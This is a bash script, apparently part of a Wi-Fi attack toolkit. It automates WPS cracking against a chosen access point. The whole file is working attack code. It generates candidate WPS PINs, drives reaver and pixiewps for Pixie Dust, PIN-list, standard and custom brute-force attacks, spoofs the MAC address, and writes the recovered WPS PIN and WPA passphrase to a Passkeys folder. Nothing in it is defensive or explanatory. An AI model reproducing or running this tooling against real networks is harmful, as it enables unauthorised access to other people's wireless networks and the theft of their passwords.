#!/bin/bash
#
#

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0 && tput bold)
BLUE=$(tput setaf 6 && tput bold)

Details(){

DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd | sed -e 's/\/Applications//g')

AP_essid=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $1 }' | sed -e 's/+/ /g' -e 's/^/"/g' -e 's/$/"/g')
AP_bssid=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $2 }')
AP_channel=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $4 }' | sed 's/Channel-//g')
AP_Name=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $1 }')
monX=$(cat $DIR/TempFolder/MonitorModeInterface.txt | awk '{ print $1 }')

}

PinGeneration(){

PinMAC1=$(echo $AP_bssid | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $AP_bssid | sed 's/://g' | cut -c 1-6)
WPSpin1=$(python $DIR/Applications/WPSpin.py $PinMAC1 | awk '{ print $7 }')
WPSpin2=$(python $DIR/Applications/WPSpin.py $PinMAC2 | awk '{ print $7 }')
DLink=$(python $DIR/Applications/DLink.py $AP_bssid | awk '{ print $3 }')
easybox=$(python $DIR/Applications/easybox_wps.py $AP_bssid | grep "WPS pin" | cut -c 10-17)
$DIR/Applications/WPSPIN1.5_wps.pin.generator.sh
echo $WPSpin1 >> $DIR/TempFolder/Pins.txt
echo $WPSpin2 >> $DIR/TempFolder/Pins.txt
echo $DLink >> $DIR/TempFolder/Pins.txt
echo $easybox >> $DIR/TempFolder/Pins.txt
awk '!_[$1]++' $DIR/TempFolder/Pins.txt > $DIR/TempFolder/PinsCleaned.txt
sed -ni '/^.\{8\}/p' $DIR/TempFolder/PinsCleaned.txt
rm $DIR/TempFolder/Pins.txt

PinList=$(cat $DIR/TempFolder/PinsCleaned.txt)
PresentedPins=$(cat $DIR/TempFolder/PinsCleaned.txt | fmt -w 2500)

}

WPSMenu(){

unset SESSION_MANAGER

while true
do

while true
do

clear
echo $RED"Target Details:$STAND $AP_essid $AP_bssid"$STAND
echo ""
echo $RED"Possible WPS Pins:$STAND $PresentedPins"$STAND
echo ""
echo $RED"["$GREEN"1"$RED"]"$GREEN" = Pixie Dust Attack"
echo $RED"["$GREEN"2"$RED"]"$GREEN" = Try Possible WPS Pins$STAND (reaver)"$STAND
echo $RED"["$GREEN"3"$RED"]"$GREEN" = Reaver Standard Attack"$STAND
echo $RED"["$GREEN"4"$RED"]"$GREEN" = Reaver Custom Attack"$STAND
echo $RED"["$GREEN"s"$RED"]"$GREEN" = Script Launcher"$STAND
echo $RED"["$GREEN"p"$RED"]"$GREEN" = Proceed To Attack The Next Target"$STAND
echo ""
read -p $GREEN"Please choose an option$STAND: " MenuOptions

case $MenuOptions in
1|2|3|4|s|p)
break ;;
*) ;;
esac
done

if [[ $MenuOptions == "1" ]]; then

   clear
   PixieDustAttack

fi

if [[ $MenuOptions == "2" ]]; then

   clear
   ReaverAndPinAttack

fi

if [[ $MenuOptions == "3" ]]; then

   clear
   ReaverStandardAttack

fi

if [[ $MenuOptions == "4" ]]; then

   clear
   CustomAttack

fi

if [[ $MenuOptions == "s" ]]; then

   clear
   ScriptLauncher

fi

if [[ $MenuOptions == "p" ]]; then

   exit

fi

done

}

TryRecoveredPixiePin(){

rm $DIR/TempFolder/TryPixiePin.txt &> /dev/null
rm $DIR/TempFolder/AP_Details.txt &> /dev/null

echo ""
echo "reaver -i $monX -c $AP_channel -b $AP_bssid -p $PixiePin -vvv --mac=00:11:22:33:44:55"

xterm -geometry 100x20+650+0 -l -lf $DIR/TempFolder/TryPixiePin.txt -e "reaver -i $monX -c $AP_channel -b $AP_bssid -p $PixiePin -vvv --mac=00:11:22:33:44:55"

PasskeyCheck=$(cat $DIR/TempFolder/TryPixiePin.txt | sed '/^$/d' | sed 's/Pin cracked/\n\nPin cracked/g' | sed -e '/./{H;$!d;}' -e 'x;/WPS PIN:/!d;/WPA PSK:/!d;/AP SSID:/!d')
if [[ $PasskeyCheck ]]; then

   echo ""
   echo $RED"Recovered passkey will be coppied to:$STAND $DIR/Passkeys/$AP_Name"$STAND
   echo ""
   read -p $GREEN"Password recovery was successful, Press [Enter] to continue.$STAND"

   WPSPIN=$(cat $DIR/TempFolder/TryPixiePin.txt | grep -e "WPS PIN:" | rev | awk '{ print $1 }' | rev | sort -u)
   PASSPHRASE=$(cat $DIR/TempFolder/TryPixiePin.txt | grep -e "WPA PSK:" | rev | awk '{ print $1 }' | rev | sort -u)

   echo "AP ESSID: $AP_essid" > $DIR/TempFolder/AP_Details.txt
   echo "AP BSSID: $AP_bssid" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Manufacturer: $Manufacturer" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Name: $ModelName" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Number: $ModelNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "Access Point Serial Number: $SerialNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS PIN: $WPSPIN" >> $DIR/TempFolder/AP_Details.txt
   echo "WPA PSK: $PASSPHRASE" >> $DIR/TempFolder/AP_Details.txt

   cp $DIR/TempFolder/AP_Details.txt $DIR/Passkeys/"$AP_Name".txt

   rm $DIR/TempFolder/TryPixiePin.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null
   rm $DIR/TempFolder/PixieDetails.txt &> /dev/null

   WPSMenu

else

   rm $DIR/TempFolder/TryPixiePin.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null
   rm $DIR/TempFolder/PixieDetails.txt &> /dev/null

   echo ""
   echo $RED"Password recovery failed, returning to attack menu..."$STAND
   sleep 5

   WPSMenu

fi

}

PixieDustAttack(){

rm $DIR/TempFolder/PixieDetails.txt &> /dev/null
rm $DIR/TempFolder/AP_Details.txt &> /dev/null
rm $DIR/TempFolder/TryPixiePin.txt &> /dev/null
rm $DIR/TempFolder/PixieDustAttack.txt &> /dev/null

echo ""
echo $RED"Reaver Pixie Dust Attack Arguments:"$STAND
echo "reaver -i $monX -c $AP_channel -b $AP_bssid -vvv -P --mac=00:11:22:33:44:55"

xterm -geometry 100x20+650+0 -l -lf $DIR/TempFolder/PixieDetails.txt -e "reaver -i $monX -c $AP_channel -b $AP_bssid -vvv -P --mac=00:11:22:33:44:55" &

sleep 5

PixieDetailsCheck=$(cat $DIR/TempFolder/PixieDetails.txt | sed '/\[P\]/!d' | sed 's/\[P\] E-Nonce/\n\n\[P\] E-Nonce/g' | sed -e '/./{H;$!d;}' -e 'x;/E-Nonce:/!d;/PKE:/!d;/R-Nonce:/!d;/PKR:/!d;/AuthKey:/!d;/E-Hash1:/!d;/E-Hash2:/!d' | sed '/^$/d' | sed 11q | sed '1i\\' | tac | sed '1i\\' | tac | sed -e '/./{H;$!d;}' -e 'x;/E-Nonce/!d;/PKE/!d;/WPS Manufacturer/!d;/WPS Model Name/!d;/WPS Model Number/!d;/Access Point Serial Number/!d;/R-Nonce/!d;/PKR/!d;/AuthKey/!d;/E-Hash1/!d;/E-Hash2/!d' | sed 's/\[P\] //g')                          
if [[ $PixieDetailsCheck ]]; then

   killall reaver

else

   sleep 5

   PixieDetailsCheck=$(cat $DIR/TempFolder/PixieDetails.txt | sed '/\[P\]/!d' | sed 's/\[P\] E-Nonce/\n\n\[P\] E-Nonce/g' | sed -e '/./{H;$!d;}' -e 'x;/E-Nonce:/!d;/PKE:/!d;/R-Nonce:/!d;/PKR:/!d;/AuthKey:/!d;/E-Hash1:/!d;/E-Hash2:/!d' | sed '/^$/d' | sed 11q | sed '1i\\' | tac | sed '1i\\' | tac | sed -e '/./{H;$!d;}' -e 'x;/E-Nonce/!d;/PKE/!d;/WPS Manufacturer/!d;/WPS Model Name/!d;/WPS Model Number/!d;/Access Point Serial Number/!d;/R-Nonce/!d;/PKR/!d;/AuthKey/!d;/E-Hash1/!d;/E-Hash2/!d' | sed 's/\[P\] //g')                          
   if [[ $PixieDetailsCheck ]]; then

      killall reaver

   else

      sleep 5

      PixieDetailsCheck=$(cat $DIR/TempFolder/PixieDetails.txt | sed '/\[P\]/!d' | sed 's/\[P\] E-Nonce/\n\n\[P\] E-Nonce/g' | sed -e '/./{H;$!d;}' -e 'x;/E-Nonce:/!d;/PKE:/!d;/R-Nonce:/!d;/PKR:/!d;/AuthKey:/!d;/E-Hash1:/!d;/E-Hash2:/!d' | sed '/^$/d' | sed 11q | sed '1i\\' | tac | sed '1i\\' | tac | sed -e '/./{H;$!d;}' -e 'x;/E-Nonce/!d;/PKE/!d;/WPS Manufacturer/!d;/WPS Model Name/!d;/WPS Model Number/!d;/Access Point Serial Number/!d;/R-Nonce/!d;/PKR/!d;/AuthKey/!d;/E-Hash1/!d;/E-Hash2/!d' | sed 's/\[P\] //g')                          
      if [[ $PixieDetailsCheck ]]; then

         killall reaver

      else

         killall reaver

         RouterDetailsCheck=$(cat $DIR/TempFolder/PixieDetails.txt | grep -e "WPS Manufacturer" -e "WPS Model Name" -e "WPS Model Number" -e "Access Point Serial Number" | sort -u | sed -e 's/\[P\]//g' -e 's/^ //g')                          
         if [[ $RouterDetailsCheck ]]; then

            RouterDetails=$(cat $DIR/TempFolder/PixieDetails.txt | grep -e "WPS Manufacturer" -e "WPS Model Name" -e "WPS Model Number" -e "Access Point Serial Number" | sort -u | sed -e 's/\[P\]//g' -e 's/^ //g') 

            Manufacturer=$(echo "$RouterDetails" | grep "WPS Manufacturer:" | sed 's/WPS Manufacturer: //g')
            ModelName=$(echo "$RouterDetails" | grep "WPS Model Name:" | sed 's/WPS Model Name: //g')
            ModelNumber=$(echo "$RouterDetails" | grep "WPS Model Number:" | sed 's/WPS Model Number: //g')
            SerialNumber=$(echo "$RouterDetails" | grep "Access Point Serial Number:" | sed 's/Access Point Serial Number: //g')

         fi


         echo $RED"Unable to retrieve the required details, returning to attack options menu..."$STAND
         sleep 3

         WPSMenu

      fi

   fi

fi

RouterDetailsCheck=$(cat $DIR/TempFolder/PixieDetails.txt | grep -e "WPS Manufacturer" -e "WPS Model Name" -e "WPS Model Number" -e "Access Point Serial Number" | sort -u | sed -e 's/\[P\]//g' -e 's/^ //g')                          
if [[ $RouterDetailsCheck ]]; then

   RouterDetails=$(cat $DIR/TempFolder/PixieDetails.txt | grep -e "WPS Manufacturer" -e "WPS Model Name" -e "WPS Model Number" -e "Access Point Serial Number" | sort -u | sed -e 's/\[P\]//g' -e 's/^ //g') 

   Manufacturer=$(echo "$RouterDetails" | grep "WPS Manufacturer:" | sed 's/WPS Manufacturer: //g')
   ModelName=$(echo "$RouterDetails" | grep "WPS Model Name:" | sed 's/WPS Model Name: //g')
   ModelNumber=$(echo "$RouterDetails" | grep "WPS Model Number:" | sed 's/WPS Model Number: //g')
   SerialNumber=$(echo "$RouterDetails" | grep "Access Point Serial Number:" | sed 's/Access Point Serial Number: //g')

fi

ENonce=$(echo "$PixieDetailsCheck" | grep "E-Nonce:" | sed 's/E-Nonce://g' | strings | sed 's/ //g')
PKE=$(echo "$PixieDetailsCheck" | grep "PKE:" | sed 's/PKE://g' | strings | sed 's/ //g')
RNonce=$(echo "$PixieDetailsCheck" | grep "R-Nonce:" | sed 's/R-Nonce://g' | strings | sed 's/ //g')
PKR=$(echo "$PixieDetailsCheck" | grep "PKR:" | sed 's/PKR://g' | strings | sed 's/ //g')
AuthKey=$(echo "$PixieDetailsCheck" | grep "AuthKey:" | sed 's/AuthKey://g' | strings | sed 's/ //g')
EHash1=$(echo "$PixieDetailsCheck" | grep "E-Hash1:" | sed 's/E-Hash1://g' | strings | sed 's/ //g')
EHash2=$(echo "$PixieDetailsCheck" | grep "E-Hash2:" | sed 's/E-Hash2://g' | strings | sed 's/ //g')

pixiewps -e $PKE -r $PKR -s $EHash1 -z $EHash2 -a $AuthKey -n $ENonce -v 3 | tee $DIR/TempFolder/PixieDustAttack.txt

PixieCheck=$(cat $DIR/TempFolder/PixieDustAttack.txt | grep "+")                       
if [[ $PixieCheck ]]; then

   PixiePin=$(echo "$PixieCheck" | grep "+" | awk '{ print $4 }')

fi

PixieCheck1=$(cat $DIR/TempFolder/PixieDustAttack.txt | grep "Try again")      
if [[ $PixieCheck1 ]]; then

   echo $RED"Attempting Bruteforce Method."$STAND
   echo ""

   pixiewps -e $PKE -r $PKR -s $EHash1 -z $EHash2 -a $AuthKey -n $ENonce -v 3 -f | tee $DIR/TempFolder/PixieDustAttack.txt

   PixieCheck2=$(cat $DIR/TempFolder/PixieDustAttack.txt | grep "+")                       
   if [[ $PixieCheck2 ]]; then

      PixiePin=$(echo "$PixieCheck2" | grep "+" | awk '{ print $4 }')

   fi

fi

WPSPinCheck=$(echo "$PixiePin")                       
if [[ $WPSPinCheck ]]; then

   TryRecoveredPixiePin

else

   rm $DIR/TempFolder/TryPixiePin.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null
   rm $DIR/TempFolder/PixieDetails.txt &> /dev/null
   rm $DIR/TempFolder/PixieDustAttack.txt &> /dev/null

   echo $RED"Pixie attack failed, returning to attack menu..."$STAND
   sleep 5

   WPSMenu

fi

}

ReaverAndPinAttack(){

PinGeneration

while true
do

clear
WPSPin=$(cat $DIR/TempFolder/PinsCleaned.txt | head -1 | awk '{ print $1 }')

echo ""
echo $RED"Reaver And Pin Generators Attack Arguments:"$STAND
echo "reaver -i $monX -c $AP_channel -b $AP_bssid -p $WPSPin -vvv --mac=00:11:22:33:44:55"
sleep 3

rm $DIR/TempFolder/ReaverAndPinAttack.txt &> /dev/null

xterm -geometry 100x20+650+0 -l -lf $DIR/TempFolder/ReaverAndPinAttack.txt -e "reaver -i $monX -c $AP_channel -b $AP_bssid -p $WPSPin -vvv --mac=00:11:22:33:44:55"

PasskeyCheck=$(cat $DIR/TempFolder/ReaverAndPinAttack.txt | sed '/^$/d' | sed 's/Pin cracked/\n\nPin cracked/g' | sed -e '/./{H;$!d;}' -e 'x;/WPS PIN:/!d;/WPA PSK:/!d;/AP SSID:/!d')
if [[ $PasskeyCheck ]]; then

   echo ""
   echo $RED"Recovered passkey will be coppied to:$STAND $DIR/Passkeys/$AP_Name"$STAND
   echo ""
   read -p $GREEN"Password recovery was successful, Press [Enter] to continue.$STAND"

   WPSPIN=$(cat $DIR/TempFolder/ReaverAndPinAttack.txt | grep -e "WPS PIN:" | rev | awk '{ print $1 }' | rev | sort -u)
   PASSPHRASE=$(cat $DIR/TempFolder/ReaverAndPinAttack.txt | grep -e "WPA PSK:" | rev | awk '{ print $1 }' | rev | sort -u)

   echo "AP ESSID: $AP_essid" > $DIR/TempFolder/AP_Details.txt
   echo "AP BSSID: $AP_bssid" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Manufacturer: $Manufacturer" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Name: $ModelName" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Number: $ModelNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "Access Point Serial Number: $SerialNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS PIN: $WPSPIN" >> $DIR/TempFolder/AP_Details.txt
   echo "WPA PSK: $PASSPHRASE" >> $DIR/TempFolder/AP_Details.txt

   cp $DIR/TempFolder/AP_Details.txt $DIR/Passkeys/"$AP_Name".txt

   rm $DIR/TempFolder/ReaverAndPinAttack.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null
   rm $DIR/TempFolder/PixieDetails.txt &> /dev/null

   WPSMenu

else

   sed -i '1d' $DIR/TempFolder/PinsCleaned.txt

   Check_For_Pins=$(cat $DIR/TempFolder/PinsCleaned.txt)
   if [[ $Check_For_Pins ]]; then

      WPSPin=$(cat $DIR/TempFolder/PinsCleaned.txt | head -1)
      PresentedPins1=$(cat $DIR/TempFolder/PinsCleaned.txt | fmt -w 2500)

      while true
      do

      clear
      echo $RED"Pin attempt failed:"$STAND
      echo ""
      echo $RED"Possible WPS Pins:$STAND $PresentedPins1"$STAND
      echo ""
      echo $RED"["$GREEN"1"$RED"]"$GREEN" = Try The Next Pin"$STAND
      echo $RED"["$GREEN"2"$RED"]"$GREEN" = Quit Trying Pins"$STAND
      echo ""
      read -p $GREEN"Please choose an option:$STAND " RetryOption

      case $RetryOption in
      1|2)
      break ;;
      *) ;;
      esac
      done

      if [[ $RetryOption == "2" ]]; then

         rm $DIR/TempFolder/ReaverAndPinAttack.txt &> /dev/null
         rm $DIR/TempFolder/AP_Details.txt &> /dev/null

         WPSMenu

      fi

   else

      clear
      echo $RED"All possible wps pins have been tried."$STAND
      sleep 3

      rm $DIR/TempFolder/ReaverAndPinAttack.txt &> /dev/null
      rm $DIR/TempFolder/AP_Details.txt &> /dev/null

      WPSMenu

   fi

fi

done

}

ReaverStandardAttack(){

rm $DIR/TempFolder/ReaverStandardAttack.txt &> /dev/null

clear
echo $RED"Reaver Standard Attack Arguments:"$STAND
echo $RED"reaver -i $monX -c $AP_channel -b $AP_bssid -vvv --mac=00:11:22:33:44:55"$STAND
sleep 3

xterm -geometry 100x20+650+0 -l -lf $DIR/TempFolder/ReaverStandardAttack.txt -e "reaver -i $monX -c $AP_channel -b $AP_bssid -vvv --mac=00:11:22:33:44:55"

PasskeyCheck=$(cat $DIR/TempFolder/ReaverStandardAttack.txt | sed '/^$/d' | sed 's/Pin cracked/\n\nPin cracked/g' | sed -e '/./{H;$!d;}' -e 'x;/WPS PIN:/!d;/WPA PSK:/!d;/AP SSID:/!d')
if [[ $PasskeyCheck ]]; then

   echo ""
   echo $RED"Recovered passkey will be coppied to:$STAND $DIR/Passkeys/$AP_Name"$STAND
   echo ""
   read -p $GREEN"Password recovery was successful, Press [Enter] to continue.$STAND"

   WPSPIN=$(cat $DIR/TempFolder/ReaverStandardAttack.txt | grep -e "WPS PIN:" | rev | awk '{ print $1 }' | rev | sort -u)
   PASSPHRASE=$(cat $DIR/TempFolder/ReaverStandardAttack.txt | grep -e "WPA PSK:" | rev | awk '{ print $1 }' | rev | sort -u)

   echo "AP ESSID: $AP_essid" > $DIR/TempFolder/AP_Details.txt
   echo "AP BSSID: $AP_bssid" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Manufacturer: $Manufacturer" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Name: $ModelName" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Number: $ModelNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "Access Point Serial Number: $SerialNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS PIN: $WPSPIN" >> $DIR/TempFolder/AP_Details.txt
   echo "WPA PSK: $PASSPHRASE" >> $DIR/TempFolder/AP_Details.txt

   cp $DIR/TempFolder/AP_Details.txt $DIR/Passkeys/"$AP_Name".txt

   rm $DIR/TempFolder/ReaverStandardAttack.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null
   rm $DIR/TempFolder/PixieDetails.txt &> /dev/null

   WPSMenu

else

   rm $DIR/TempFolder/ReaverStandardAttack.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null
   rm $DIR/TempFolder/PixieDetails.txt &> /dev/null

   echo ""
   echo $RED"Password recovery failed, returning to attack menu..."$STAND
   sleep 5

   WPSMenu

fi

}

CustomAttack(){

while true
do

clear
echo $RED"Reaver Custom Attack Arguments:"$STAND
echo "reaver -i $monX -c $AP_channel -b $AP_bssid <CustomArgumentsHere> --mac=00:11:22:33:44:55"
echo ""
read -p $GREEN"Please input the arguments you want to use$STAND: " CustomArguments
clear
echo $RED"Chosen Attack Arguments:"$STAND
echo "reaver -i $monX -c $AP_channel -b $AP_bssid $CustomArguments --mac=00:11:22:33:44:55"
echo ""
read -p $GREEN"Are the chosen arguments correct? y/n$STAND: " Proceed

case $Proceed in
y)
break ;;
*) ;;
esac
done

xterm -geometry 100x20+650+0 -l -lf $DIR/TempFolder/CustomAttack.txt -e "reaver -i $monX -c $AP_channel -b $AP_bssid $CustomArguments --mac=00:11:22:33:44:55"

PasskeyCheck=$(cat $DIR/TempFolder/CustomAttack.txt | sed '/^$/d' | sed 's/Pin cracked/\n\nPin cracked/g' | sed -e '/./{H;$!d;}' -e 'x;/WPS PIN:/!d;/WPA PSK:/!d;/AP SSID:/!d')
if [[ $PasskeyCheck ]]; then

   echo ""
   echo $RED"Recovered passkey will be coppied to:$STAND $DIR/Passkeys/$AP_Name"$STAND
   echo ""
   read -p $GREEN"Password recovery was successful, Press [Enter] to continue.$STAND"

   WPSPIN=$(cat $DIR/TempFolder/CustomAttack.txt | grep -e "WPS PIN:" | rev | awk '{ print $1 }' | rev | sort -u)
   PASSPHRASE=$(cat $DIR/TempFolder/CustomAttack.txt | grep -e "WPA PSK:" | rev | awk '{ print $1 }' | rev | sort -u)

   echo "AP ESSID: $AP_essid" > $DIR/TempFolder/AP_Details.txt
   echo "AP BSSID: $AP_bssid" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Manufacturer: $Manufacturer" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Name: $ModelName" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS Model Number: $ModelNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "Access Point Serial Number: $SerialNumber" >> $DIR/TempFolder/AP_Details.txt
   echo "" >> $DIR/TempFolder/AP_Details.txt
   echo "WPS PIN: $WPSPIN" >> $DIR/TempFolder/AP_Details.txt
   echo "WPA PSK: $PASSPHRASE" >> $DIR/TempFolder/AP_Details.txt

   cp $DIR/TempFolder/AP_Details.txt $DIR/Passkeys/"$AP_Name".txt

   rm $DIR/TempFolder/CustomAttack.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null

   WPSMenu

else

   rm $DIR/TempFolder/CustomAttack.txt &> /dev/null
   rm $DIR/TempFolder/AP_Details.txt &> /dev/null

   echo ""
   echo $RED"Password recovery failed, returning to attack menu..."$STAND
   sleep 5

   WPSMenu

fi

}

clear
Details
PinGeneration
WPSMenu
